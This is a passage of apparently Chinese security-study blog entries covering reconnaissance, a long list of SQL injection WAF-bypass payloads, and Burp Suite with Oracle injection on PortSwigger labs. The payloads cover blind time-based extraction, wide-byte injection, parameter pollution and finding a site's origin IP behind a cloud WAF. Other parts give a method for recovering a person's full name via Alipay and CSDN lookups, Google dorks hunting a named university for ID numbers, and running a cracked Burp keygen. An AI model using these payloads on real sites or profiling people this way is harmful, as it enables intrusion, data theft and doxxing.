社工库:<br>领英:<br>支付宝:手机支付宝给别人转账,然后可以知道第一位和最后一位姓名,利用手机号可以获得姓名最后一位,利用csdn的验证服务可以获取姓名的前一位,中间的那一位可以进行爆破.<br>学信网 :<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704467015797-e588858e-595c-4a87-8be1-b066e44f37bf.png" alt="image.png"></p><h1 id="五-查看网站组成"><a href="#五-查看网站组成" class="headerlink" title="五.查看网站组成:"></a>五.查看网站组成:</h1><p>下载组件:wappalyzer<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704467719582-99c86101-1d3b-4cbf-ba9f-246eb6e1d0c7.png" alt="image.png"><br>通过插件查看网站的组成:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704467871894-33d959c2-c80c-4b31-8715-29863184ef21.png" alt="image.png"></p><h1 id=""><a href="#" class="headerlink" title=""></a></h1><p>六.百度和谷歌语法:<br>百度和谷歌：百度上面可能会有广告，可以用插件屏蔽广告</p><h2 id="百度："><a href="#百度：" class="headerlink" title="百度："></a>百度：</h2><p>搜什么+关键词-关键词<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704525089895-ee494a61-bd9a-4dac-a877-332a910602eb.png" alt="image.png"></p><p>搜索之后为什么会出现先后顺序，主要是因为seo<br>seo叫中文搜索引擎优化，是根据实时的情况反映的结果。谷歌的seo值是全球的，百度的是国内的。<br>搜索专业知识用谷歌，搜索基础知识用百度。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704526155726-092e4c27-24a0-489e-83f2-3ac49e168d5e.png" alt="image.png"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704526302671-f51721b2-cd23-4bd6-ba11-dde7fc016157.png" alt="image.png"></p><h2 id="谷歌："><a href="#谷歌：" class="headerlink" title="谷歌："></a>谷歌：</h2><p>单独的mac地址搜索结果：<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704526577519-11d3a4d2-3909-4ed7-8ccb-e99e7f3950d1.png" alt="image.png"><br>“mac地址”：表示搜索的mac地址连在一起<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704526713953-acd58f8b-f3ff-430b-aabd-4edeb0882319.png" alt="image.png"><br>mac*：可以匹配任意 一个字符串<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704526759217-b7990d22-5dbe-465f-b029-3388310da8a3.png" alt="image.png"><br>mac+-同样适用<br>直接搜域名：例：”hnuit.edu.cn”<br>搜文本文档：”hnuit.edu.cn” filetype:pdf  学号<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704527230840-8126d0f7-71c0-48e4-a0b1-9b83c492b54f.png" alt="image.png"><br>“hnuit.edu.cn” 刘定 filetype:pdf<br>“hnuit.edu.cn” 身份证号  filetype:pdf|xlsx|doc|docx|swf|mp4<br>登录页：    “hnuit.edu.cn” inurl:login&#x2F;id<br>inurl：#地址栏中包含的内容<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704529059835-4088c99b-1be9-4cec-bd9a-5865f64ca240.png" alt="image.png"><br>“index of”:能够搜到网站根目录<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704529261817-f2d871ea-498a-4cdc-8055-8236fca0b5a3.png" alt="image.png"></p>]]></content>
      
      
      <categories>
          
          <category> 信息收集 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 信息收集基础,语法 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>绕过总结</title>
      <link href="/2024/01/08/%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/"/>
      <url>/2024/01/08/%E7%BB%95%E8%BF%87%E6%80%BB%E7%BB%93/</url>
      
        <content type="html"><![CDATA[<h4 id="1-绕过空格（注释符-，-a0）"><a href="#1-绕过空格（注释符-，-a0）" class="headerlink" title="1.绕过空格（注释符&#x2F;* *&#x2F;，%a0）"></a>1.绕过空格（注释符&#x2F;* *&#x2F;，%a0）</h4><p>两个空格代替一个空格，用Tab代替空格，%a0&#x3D;空格：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">%<span class="number">20</span> %<span class="number">09</span> %0a %0b %0c %0d %a0 %<span class="number">00</span> <span class="comment">/**/</span>  <span class="comment">/*!*/</span></span><br></pre></td></tr></table></figure><p>最基本的绕过方法，用注释替换空格：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">/*  注释 */</span></span><br></pre></td></tr></table></figure><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703588874512-f52429d0-1c12-42fe-b02d-656c6d2d06a6.png"><br>使用浮点数：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> users where id=8E0union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br><span class="line">select * <span class="keyword">from</span> users where id=<span class="number">8.0</span> select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span></span><br></pre></td></tr></table></figure><h4 id="2-括号绕过空格"><a href="#2-括号绕过空格" class="headerlink" title="2.括号绕过空格"></a>2.括号绕过空格</h4><p>如果空格被过滤，括号没有被过滤，可以用括号绕过。在<a href="https://cloud.tencent.com/product/cdb?from_column=20065&from=20065">MySQL</a>中，括号是用来包围子查询的。因此，任何可以计算出结果的语句，都可以用括号包围起来。而括号的两端，可以没有多余的空格。例如：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">select</span>(<span class="title function_">user</span>())<span class="keyword">from</span> dual <span class="title function_">where</span>(<span class="number">1</span>=<span class="number">1</span>)<span class="title function_">and</span>(<span class="number">2</span>=<span class="number">2</span>)</span><br></pre></td></tr></table></figure><p>这种过滤方法常常用于time based盲注,例如：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>%27and(<span class="title function_">sleep</span>(<span class="title function_">ascii</span>(<span class="title function_">mid</span>(<span class="title function_">database</span>()<span class="title function_">from</span>(<span class="number">1</span>)<span class="keyword">for</span>(<span class="number">1</span>)))=<span class="number">109</span>))%<span class="number">23</span></span><br></pre></td></tr></table></figure><p>（from for属于逗号绕过下面会有） 上面的方法既没有逗号也没有空格。猜解database（）第一个字符ascii码是否为109，若是则加载延时。</p><h4 id="3-引号绕过（使用十六进制）"><a href="#3-引号绕过（使用十六进制）" class="headerlink" title="3.引号绕过（使用十六进制）"></a>3.引号绕过（使用十六进制）</h4><p>会使用到引号的地方一般是在最后的where子句中。如下面的一条sql语句，这条语句就是一个简单的用来查选得到users表中所有字段的一条语句：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">select column_name  <span class="keyword">from</span> information_schema.<span class="property">tables</span> where table_name=<span class="string">&quot;users&quot;</span></span><br></pre></td></tr></table></figure><p>这个时候如果引号被过滤了，那么上面的where子句就无法使用了。那么遇到这样的问题就要使用十六进制来处理这个问题了。users的十六进制的字符串是7573657273。那么最后的sql语句就变为了：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">select column_name  <span class="keyword">from</span> information_schema.<span class="property">tables</span> where table_name=<span class="number">0x7573657273</span></span><br></pre></td></tr></table></figure><h4 id="4-逗号绕过（使用from或者offset）"><a href="#4-逗号绕过（使用from或者offset）" class="headerlink" title="4.逗号绕过（使用from或者offset）"></a>4.逗号绕过（使用from或者offset）</h4><p>在使用盲注的时候，需要使用到substr(),mid(),limit。这些子句方法都需要使用到逗号。对于substr()和mid()这两个方法可以使用from to的方式来解决：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">select <span class="title function_">substr</span>(<span class="title function_">database</span>() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br><span class="line">select <span class="title function_">mid</span>(<span class="title function_">database</span>() <span class="keyword">from</span> <span class="number">1</span> <span class="keyword">for</span> <span class="number">1</span>);</span><br></pre></td></tr></table></figure><p>使用join：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">union select <span class="number">1</span>,<span class="number">2</span>     #等价于</span><br><span class="line">union select * <span class="keyword">from</span> (select <span class="number">1</span>)a join (select <span class="number">2</span>)b</span><br></pre></td></tr></table></figure><p>使用like：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">select <span class="title function_">ascii</span>(<span class="title function_">mid</span>(<span class="title function_">user</span>(),<span class="number">1</span>,<span class="number">1</span>))=<span class="number">80</span>   #等价于</span><br><span class="line">select <span class="title function_">user</span>() like <span class="string">&#x27;r%&#x27;</span></span><br></pre></td></tr></table></figure><p>对于limit可以使用offset来绕过：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> news limit <span class="number">0</span>,<span class="number">1</span></span><br></pre></td></tr></table></figure><h1 id="等价于下面这条SQL语句"><a href="#等价于下面这条SQL语句" class="headerlink" title="等价于下面这条SQL语句"></a>等价于下面这条SQL语句</h1><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> news limit <span class="number">1</span> offset <span class="number">0</span></span><br></pre></td></tr></table></figure><h4 id="5-比较符号（）绕过（过滤了：sqlmap盲注经常使用，使用between的脚本）"><a href="#5-比较符号（）绕过（过滤了：sqlmap盲注经常使用，使用between的脚本）" class="headerlink" title="5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）"></a>5.比较符号（&lt;&gt;）绕过（过滤了&lt;&gt;：sqlmap盲注经常使用&lt;&gt;，使用between的脚本）</h4><p>使用greatest()、least（）：（前者返回最大值，后者返回最小值） 同样是在使用盲注的时候，在使用二分查找的时候需要使用到比较操作符来进行查找。如果无法使用比较操作符，那么就需要使用到greatest来进行绕过了。最常见的一个盲注的sql语句：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> users where id=<span class="number">1</span> and <span class="title function_">ascii</span>(<span class="title function_">substr</span>(<span class="title function_">database</span>(),<span class="number">0</span>,<span class="number">1</span>))&gt;<span class="number">64</span></span><br></pre></td></tr></table></figure><p>此时如果比较操作符被过滤，上面的盲注语句则无法使用,那么就可以使用greatest来代替比较操作符了。greatest(n1,n2,n3,…)函数返回输入参数(n1,n2,n3,…)的最大值。那么上面的这条sql语句可以使用greatest变为如下的子句:</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">select * <span class="keyword">from</span> users where id=<span class="number">1</span> and <span class="title function_">greatest</span>(<span class="title function_">ascii</span>(<span class="title function_">substr</span>(<span class="title function_">database</span>(),<span class="number">0</span>,<span class="number">1</span>)),<span class="number">64</span>)=<span class="number">64</span></span><br></pre></td></tr></table></figure><p>使用between and：between a and b：返回a，b之间的数据，不包含b。</p><h4 id="6-or-and-xor-not绕过"><a href="#6-or-and-xor-not绕过" class="headerlink" title="6.or and xor not绕过"></a>6.or and xor not绕过</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">and=&amp;&amp;  or=||   xor=|   not=!</span><br></pre></td></tr></table></figure><h4 id="7-绕过注释符号（-，–-后面跟一个空格））过滤"><a href="#7-绕过注释符号（-，–-后面跟一个空格））过滤" class="headerlink" title="7.绕过注释符号（#，–(后面跟一个空格））过滤"></a>7.绕过注释符号（#，–(后面跟一个空格））过滤</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">id=<span class="number">1</span><span class="string">&#x27; union select 1,2,3||&#x27;</span><span class="number">1</span></span><br></pre></td></tr></table></figure><p>最后的or ‘1闭合查询语句的最后的单引号，或者：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">id=<span class="number">1</span><span class="string">&#x27; union select 1,2,&#x27;</span><span class="number">3</span></span><br></pre></td></tr></table></figure><h4 id="8-绕过"><a href="#8-绕过" class="headerlink" title="8.&#x3D;绕过"></a>8.&#x3D;绕过</h4><p>使用like 、rlike 、regexp 或者 使用&lt; 或者 &gt;</p><h4 id="9-绕过union，select，where等"><a href="#9-绕过union，select，where等" class="headerlink" title="9.绕过union，select，where等"></a>9.绕过union，select，where等</h4><p><strong>（1）使用注释符绕过</strong><br>常用注释符：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="comment">//，-- , /**/, #, --+, -- -, ;,%00,--a</span></span><br></pre></td></tr></table></figure><p>用法：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">U<span class="comment">/**/</span> <span class="variable constant_">NION</span> <span class="comment">/**/</span> <span class="variable constant_">SE</span><span class="comment">/**/</span> <span class="variable constant_">LECT</span> <span class="comment">/**/</span>user，pwd <span class="keyword">from</span> user</span><br></pre></td></tr></table></figure><p><strong>（2）使用大小写绕过</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">id=-<span class="number">1</span><span class="string">&#x27;UnIoN/**/SeLeCT</span></span><br></pre></td></tr></table></figure><p><strong>（3）内联注释绕过</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">id=-<span class="number">1</span><span class="string">&#x27;/*!UnIoN*/ SeLeCT 1,2,concat(/*!table_name*/) FrOM /*information_schema*/.tables /*!WHERE *//*!TaBlE_ScHeMa*/ like database()#</span></span><br></pre></td></tr></table></figure><p><strong>（4） 双关键字绕过（若删除掉第一个匹配的union就能绕过）</strong></p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">id=-<span class="number">1</span><span class="string">&#x27;UNIunionONSeLselectECT1,2,3–-</span></span><br></pre></td></tr></table></figure><h4 id="10-通用绕过（编码）"><a href="#10-通用绕过（编码）" class="headerlink" title="10.通用绕过（编码）"></a>10.通用绕过（编码）</h4><p>如URLEncode编码，ASCII,HEX,unicode编码绕过：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">or <span class="number">1</span>=<span class="number">1</span>即%6f%<span class="number">72</span>%<span class="number">20</span>%<span class="number">31</span>%3d%<span class="number">31</span>，而<span class="title class_">Test</span>也可以为<span class="title function_">CHAR</span>(<span class="number">101</span>)+<span class="title function_">CHAR</span>(<span class="number">97</span>)+<span class="title function_">CHAR</span>(<span class="number">115</span>)+<span class="title function_">CHAR</span>(<span class="number">116</span>)。</span><br></pre></td></tr></table></figure><h4 id="11-等价函数绕过"><a href="#11-等价函数绕过" class="headerlink" title="11.等价函数绕过"></a>11.等价函数绕过</h4><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">hex</span>()、<span class="title function_">bin</span>() ==&gt; <span class="title function_">ascii</span>()</span><br><span class="line"><span class="title function_">sleep</span>() ==&gt;<span class="title function_">benchmark</span>()</span><br><span class="line"><span class="title function_">concat_ws</span>()==&gt;<span class="title function_">group_concat</span>()</span><br><span class="line"><span class="title function_">mid</span>()、<span class="title function_">substr</span>() ==&gt; <span class="title function_">substring</span>()</span><br><span class="line">@@user ==&gt; <span class="title function_">user</span>()</span><br><span class="line">@@datadir ==&gt; <span class="title function_">datadir</span>()</span><br></pre></td></tr></table></figure><p>举例：substring()和substr()无法使用时：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">?id=<span class="number">1</span>+and+<span class="title function_">ascii</span>(<span class="title function_">lower</span>(<span class="title function_">mid</span>((select+pwd+<span class="keyword">from</span>+users+limit+<span class="number">1</span>,<span class="number">1</span>),<span class="number">1</span>,<span class="number">1</span>)))=<span class="number">74</span></span><br></pre></td></tr></table></figure><p>或者：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title function_">substr</span>((select <span class="string">&#x27;password&#x27;</span>),<span class="number">1</span>,<span class="number">1</span>) = <span class="number">0x70</span></span><br><span class="line"><span class="title function_">strcmp</span>(<span class="title function_">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x69</span>) = <span class="number">1</span></span><br><span class="line"><span class="title function_">strcmp</span>(<span class="title function_">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x70</span>) = <span class="number">0</span></span><br><span class="line"><span class="title function_">strcmp</span>(<span class="title function_">left</span>(<span class="string">&#x27;password&#x27;</span>,<span class="number">1</span>), <span class="number">0x71</span>) = -<span class="number">1</span></span><br></pre></td></tr></table></figure><h4 id="12-宽字节注入"><a href="#12-宽字节注入" class="headerlink" title="12.宽字节注入"></a>12.宽字节注入</h4><p>过滤 ‘ 的时候往往利用的思路是将 ‘ 转换为 ‘ 。在 mysql 中使用 GBK 编码的时候，会认为两个字符为一个汉字，一般有两种思路：（1）%df 吃掉 \ 具体的方法是 urlencode(‘) &#x3D; %5c%27，我们在 %5c%27 前面添加 %df ，形成 %df%5c%27 ，而 mysql 在 GBK 编码方式的时候会将两个字节当做一个汉字，%df%5c 就是一个汉字，%27 作为一个单独的（’）符号在外面：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">id=-<span class="number">1</span>%df%27union select <span class="number">1</span>,<span class="title function_">user</span>(),<span class="number">3</span>--+</span><br></pre></td></tr></table></figure><p>（2）将 ‘ 中的 \ 过滤掉，例如可以构造 %**%5c%5c%27 ，后面的 %5c 会被前面的 %5c 注释掉。一般产生宽字节注入的PHP函数：1.replace（）：过滤 ‘ \ ，将 ‘ 转化为 ‘ ，将 \ 转为 \，将 “ 转为 “ 。用思路一。2.addslaches()：返回在预定义字符之前添加反斜杠（\）的字符串。预定义字符：’ , “ , \ 。用思路一 （防御此漏洞，要将 mysql_query 设置为 binary 的方式） 3.mysql_real_escape_string()：转义下列字符：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">\x00     \n     \r     \     <span class="string">&#x27;     &quot;     \x1a</span></span><br></pre></td></tr></table></figure><p>（防御，将mysql设置为gbk即可）</p><h4 id="13-多参数请求拆分"><a href="#13-多参数请求拆分" class="headerlink" title="13.多参数请求拆分"></a>13.多参数请求拆分</h4><p>对于多个参数拼接到同一条SQL语句中的情况，可以将注入语句分割插入。<br>例如请求URL时，GET参数格式如下：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">a=[input1]&amp;b=[input2]</span><br></pre></td></tr></table></figure><p>将GET的参数a和参数b拼接到SQL语句中，SQL语句如下所示。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">and a=[input1] and b=[input2]</span><br></pre></td></tr></table></figure><p>这时就可以将注入语句进行拆分，如下所示：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">a=union<span class="comment">/*&amp;b=*/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure><p>最终将参数a和参数b拼接，得到的SQL语句如下所示：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">and a=union <span class="comment">/*and b=*/</span>select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure><h4 id="14-HTTP参数污染"><a href="#14-HTTP参数污染" class="headerlink" title="14.HTTP参数污染"></a>14.HTTP参数污染</h4><p>HTTP参数污染是指当同一个参数出现多次，不同的<a href="https://cloud.tencent.com/product/tdmq?from_column=20065&from=20065">中间件</a>会解析为不同的结果。具体如下图所示：（以参数color&#x3D;red&amp;color&#x3D;blue为例）。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703588874536-52f29c81-082b-4c4e-a84b-bdc7682cd6fe.jpeg"><br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1703659616832-b9db3571-11ff-439b-853c-cf71d8ad261a.png" alt="image.png">可见，IIS比较容易利用，可以直接分割带逗号的SQL语句。在其余的中间件中，如果WAF只检测了通参数名中的第一个或最后一个，并且中间件的特性正好取与WAF相反的参数，则可成功绕过。下面以IIS为例，一般的SQL注入语句如下所示：</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Inject</span>=union select <span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure><p>将SQL注入语句转换为以下格式。</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Inject</span>=union<span class="comment">/*&amp;inject=*/</span>select<span class="comment">/*&amp;inject=*/</span><span class="number">1</span>&amp;inject=<span class="number">2</span>&amp;inject=<span class="number">3</span>&amp;inject=<span class="number">4</span></span><br></pre></td></tr></table></figure><p>最终在IIS中读取的参数值将如下所示</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line"><span class="title class_">Inject</span>=union<span class="comment">/*, */</span>select<span class="comment">/*, */</span><span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span></span><br></pre></td></tr></table></figure><h4 id="15-生僻函数"><a href="#15-生僻函数" class="headerlink" title="15.生僻函数"></a>15.生僻函数</h4><p>使用生僻函数替代常见的函数，例如在报错注入中使用polygon()函数替换常用的updatexml()函数</p><figure class="highlight javascript"><table><tr><td class="code"><pre><span class="line">select <span class="title function_">polygon</span>((select * <span class="keyword">from</span> (select * <span class="keyword">from</span> (select @@version) f) x));</span><br></pre></td></tr></table></figure><h4 id="16-寻找网站源IP"><a href="#16-寻找网站源IP" class="headerlink" title="16.寻找网站源IP"></a>16.寻找网站源IP</h4><p>对于具有云WAF防护的网站，只要找到网站的IP地址，通过IP访问网站，就可以绕过云WAF检测。<br>常见的寻找网站IP的方法由以下几种</p><ul><li>寻找网站的历史解析记录</li><li>多个不同区域ping网站，查看IP解析的结果</li><li>找网站的二级<a href="https://cloud.tencent.com/act/pro/domain-sales?from_column=20065&from=20065">域名</a>、NS、MX记录等对应的IP</li><li>订阅网站邮件，查看邮件发送方的IP</li></ul><h4 id="17-注入参数到cookie中"><a href="#17-注入参数到cookie中" class="headerlink" title="17.注入参数到cookie中"></a>17.注入参数到cookie中</h4><p>某些程序员在代码中使用REQUEST获取参数，而_REQUEST会依次从GET&#x2F;POST&#x2F;cookie中获取参数，如果WAF只检测了GET&#x2F;POST而没有检测cookie,则可以将注入语句放入cookie中进行绕过。</p><h4 id="18-宽字节常用url编码"><a href="#18-宽字节常用url编码" class="headerlink" title="18.宽字节常用url编码"></a>18.宽字节常用url编码</h4><p>&amp;：%26<br>||：%7C%7C<br>空格：%20<br>#：%23<br>’:%27<br>”:%22<br>%bb:吃掉<br>%df:十六进制表示</p>]]></content>
      
      
      <categories>
          
          <category> sql注入 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> sql绕过总结 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Burp的安装与使用,SQL注入之Oracle数据库</title>
      <link href="/2024/01/01/Burp%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E6%95%B0%E6%8D%AE%E5%BA%93/"/>
      <url>/2024/01/01/Burp%E7%9A%84%E5%AE%89%E8%A3%85%E4%B8%8E%E4%BD%BF%E7%94%A8-SQL%E6%B3%A8%E5%85%A5%E4%B9%8BOracle%E6%95%B0%E6%8D%AE%E5%BA%93/</url>
      
        <content type="html"><![CDATA[<h2 id="Burp的安装与使用"><a href="#Burp的安装与使用" class="headerlink" title="Burp的安装与使用"></a>Burp的安装与使用</h2><h3 id="1-安装"><a href="#1-安装" class="headerlink" title="1.安装"></a>1.安装</h3><p>1.下载并安装Burp抓包软件（半汉化版），官网链接：<a href="https://portswigger.net/burp">https://portswigger.net/burp</a><br>2.cmd打开这个路径<img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704099517933-ca05e238-4f50-46e5-a61c-672dfb2bf9cf.png" alt="image.png"><br>3.在命令窗口输入<code>Java -vision</code>确认java版本是java19<br>再输入<code>java -jar burp-loader-keygen-2_1_06.jar</code>然后会弹出下面的窗口<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704099918098-4560d7e0-6f8d-4082-ab16-dbeaa56809ea.png" alt="image.png"><br>4.然后再双击汉化启动。<br><img src="C:/Users/林尘曦/Desktop/jpg/1704099987988-6c2f6504-bbc1-4feb-b1fb-55c2d69c3f8c.png" alt="image.png"><br>5.把左边的License复制到右边，点击下一步&#x3D;&gt;手动激活。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704100090794-9822c05b-cac7-4b5c-ae09-8efafe815648.png" alt="image.png"><br>6.过程1：把右边内容复制到左边<br> 过程2：把左边下方内容复制到右边下方<br>点击下一个，激活成功<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704100270809-953b141b-b872-4df5-adcb-93610018d4ab.png" alt="image.png"></p><h3 id="2-使用"><a href="#2-使用" class="headerlink" title="2.使用"></a>2.使用</h3><p>1.sqli第一关，用Burp抓包。依次点击Proxy–&gt;intercept–&gt;打开内置浏览器–&gt;复制第一关的链接粘贴到内置浏览器–&gt;HTTP history–&gt;对应的数据包<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704100894006-a526597e-2688-40b2-a763-995a0f90cb74.png" alt="image.png"><br>2.用Burp爆破。右击数据包–&gt;发送到repeater<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704101529865-2dc05e81-8d1b-42df-98bc-96ce3ee02698.png" alt="image.png">3.    1-50迭代。右击数据包–&gt;发送到intruder     （intruder是爆破器 ）选择1–&gt;添加<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704101973577-46b49ac2-6ccc-4b8a-a5d4-96c488729f8d.png" alt="image.png"><br>4.点击Payloads–&gt;Payloads  type选择Numbers–&gt;1  50  1–&gt;点击发送<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704102160879-12f3da70-3151-418b-b89b-913f8d34bcf4.png" alt="image.png"></p><p>5.最后就可以看出哪些是可以用数字进行绕过操作的。</p><h2 id="SQL注入Oracle数据库"><a href="#SQL注入Oracle数据库" class="headerlink" title="SQL注入Oracle数据库"></a>SQL注入Oracle数据库</h2><p>1.访问靶场网站，链接：<a href="https://portswigger.net/web-security/all-labs">https://portswigger.net/web-security/all-labs</a>    </p><p>注册并登录，注意注册时的密码很长，需要进行记录，不要时时刻刻都翻译成中文，在输入密码时就会报错。</p><p>可以查看基本网站内容：</p><p><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/image-20240101234047835.png" alt="image-20240101234047835"></p><p>2.第一关，右键翻译网页，溶液代表答案，然后访问实验室。<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704096500832-6383d77a-1822-484a-bc9c-a0537242ffae.png" alt="image.png"><br>3.在地址栏输入以下代码：</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">filter?category=%27+OR+1=1--</span><br></pre></td></tr></table></figure><p>成功注入，结果如下:<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704097664693-eaf05e4f-57b5-4ea4-8520-ef490c5c8679.png" alt="image.png"></p><p>3.第二关，是SQL注入登录框  username填administrator’–，密码是随机的，填1<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704098378506-87a87d3b-cbe1-4c77-b406-c39f80a7f377.png" alt="image.png"></p><p>成功注入，结果如下<br><img src="https://raw.githubusercontent.com/tfktk/picture/main/img/1704098169171-41e3c47d-77a8-4780-bbef-7d4fabf0ef8b.png" alt="image.png"></p><p>对于oracle数据库的学习仅仅只是一个带你入门的过程，更多的是靠自己去钻研。</p><h2 id="三-oracle数据库的注入过程："><a href="#三-oracle数据库的注入过程：" class="headerlink" title="三.oracle数据库的注入过程："></a>三.oracle数据库的注入过程：</h2><h3 id="1-获取元数据"><a href="#1-获取元数据" class="headerlink" title="1. 获取元数据"></a>1. 获取元数据</h3><p>Oracle 也支持查询元数据，下面是 Oracle 注入常用的元数据视图：</p><p>① user_tablespaces 视图，查看表空间</p><p>SELECT tablespace_name FROM user_tablespaces</p><p>② user_tables 视图，查看当前用户的所有表</p><p>SELECT table_name FROM user_tables WHERE rownum &#x3D; 1</p><p>③ user_tab_columns 视图，查看当前用户的所有列，如查询 user 表的所有列：</p><p>SELECT column_name FROM user_tab_columns WHERE table_name &#x3D; ‘users’</p><p>④ all_users 视图，查看 ORacle 数据库的所有用户</p><p>SELECT username FROM all_users</p><p>⑤ user_objects 视图，查看当前用户的所有对象 (表名称、约束、索引)</p><p>SELECT object_name FROM user_objects</p><h3 id="2-UNION-查询"><a href="#2-UNION-查询" class="headerlink" title="2. UNION 查询"></a>2. UNION 查询</h3><p>Oracle 与 MySQL 一样不支持多语句执行，不像 SQL Server 那样可以用分号隔开从而注入多条 SQL 语句。</p><p>①获取列的总数</p><p>获取列总数方法与前面两种数据库类似，依然可以使用 ORDER BY 子句来完成。</p><p>另一种方法是利用 UNION 关键字来确定，但是 Oracle 规定，每次查询时后面必须跟表的名称，否则查询将不成立。</p><p>在 Oracle 中可以使用：</p><p>UNION SELECT null, null, null …… FROM dual</p><p>这里的 dual 是 Oracle 中的虚拟表，在不知道数据库中存在哪些表的情况下，可以使用此表作为查询表。</p><p>然后获取非数字类型列，即可以显示出信息的列：</p><p>UNION SELECT ‘null’, null, null, …… FROM dual</p><p>UNION SELECT null, ‘null’, null, …… FROM dual</p><p>把每一位的 null 依次用单引号 ’ 引起来，如果报错，则不是字符串类型的列；如果返回正常，则是字符串类型的列，就可以在相应的位置插入查询语句获取信息。</p><p>② 获取敏感信息</p><p>常见的敏感信息如下：</p><p>当前用户权限：SELECT * FROM session_roles</p><p>当前数据库版本：SELECT banner FROM sys.v_$version WHERE rownum &#x3D; 1</p><p>服务器出口 IP：用utl_http.request 可以实现</p><p>服务器监听 IP：SELECT utl_inaddr.get_host_address FROM dual</p><p>服务器操作系统：SELECT member FROM v$logfile WHERE rownum &#x3D; 1</p><p>服务器 SID：SELECT instance_name FROM v$instance</p><p>当前连接用户：SELECT SYS_CONTEXT(‘USERENV’, ‘CURRENT_USER’) FROM 